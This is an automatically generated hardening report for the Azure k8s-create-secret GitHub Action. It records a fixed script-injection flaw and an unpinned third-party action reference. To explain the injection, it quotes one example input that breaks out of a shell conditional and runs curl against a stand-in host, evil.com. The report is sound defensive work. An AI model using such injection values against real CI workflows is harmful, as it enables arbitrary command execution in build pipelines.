<!-- markdownlint-disable -->

# Hardening Report: Azure--k8s-create-secret/v6.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **Azure--k8s-create-secret/v6.0.0** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in the composite action directly interpolates `${{ inputs.pr-base-ref }}` into shell commands without routing through an env var. The value appears twice: (1) unquoted in `echo ${{ inputs.pr-base-ref }}`, allowing word-splitting and glob expansion; (2) inside a double-quoted string in `if [[ "${{ inputs.pr-base-ref }}" != releases/* ]]`, where the expression is substituted by the Actions runner before the shell sees it, allowing injection of arbitrary shell syntax (e.g., a value like `x ]]; curl evil.com; [[` would break out of the conditional). Both occurrences are direct expression interpolations inside a `run:` shell script and must be replaced with env-var references that are properly double-quoted.

Locations:

- `.github/actions/setup-test-environment/action.yml:30`
- `.github/actions/setup-test-environment/action.yml:31`

### unpinned-uses (severity: high)

The composite action references `medyagh/setup-minikube@latest`, which uses a mutable branch/tag ref instead of a pinned 40-character commit SHA. This means the action can be silently updated (or compromised) without any change to this file, creating a supply-chain risk. It should be pinned to a full SHA, e.g. `medyagh/setup-minikube@<40-char-sha> # latest`.

Locations:

- `.github/actions/setup-test-environment/action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection

**Notes:**

1. Pinned `medyagh/setup-minikube@latest` to full commit SHA `e9e035a86bbc3caea26a450bd4dbf9d0c453682e` with `# latest` comment for readability. 2. Moved `${{ inputs.pr-base-ref }}` into the step's `env:` block as `PR_BASE_REF` and replaced both inline interpolations with properly double-quoted `"$PR_BASE_REF"` references, preventing shell injection and word-splitting/glob-expansion issues.

